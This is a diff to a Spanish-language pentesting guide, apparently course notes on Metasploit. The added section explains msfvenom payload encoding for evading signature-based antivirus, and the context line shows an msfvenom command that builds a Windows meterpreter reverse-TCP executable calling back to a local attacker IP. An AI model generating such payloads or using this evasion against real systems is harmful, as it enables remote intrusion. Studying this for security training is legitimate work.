@@ -107,6 +107,12 @@ msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp -f exe LHOST=192.168.1.45
 
 ## 4.2. Codificación  de payloads con `Msfvenom`
 
+Dado que este vector de ataque implica la transferencia y el almacenamiento de un payload malicioso en el sistema del cliente, los atacantes deben ser conscientes de la detección por parte de los antivirus (AV). La mayoría de las soluciones antivirus para usuarios finales utilizan detección basada en firmas para identificar archivos o ejecutables maliciosos.
+
+Podemos evadir soluciones antivirus antiguas basadas en firmas mediante la codificación (encoding) de nuestros payloads. La codificación es el proceso de modificar el shellcode del payload con el objetivo de alterar su firma.
+
+El shellcode es una porción de código que normalmente se utiliza como payload durante la explotación de una vulnerabilidad. Originalmente el shellcode era un fragmento de código cuya finalidad era proporcionar a un atacante una consola remota en el sistema objetivo.
+
 ## 4.3. Inyección de payloads en ejecutables Windows
 
 [⟵ Anterior](03_shells.md) | [Siguiente ⟶](05_windows.md)
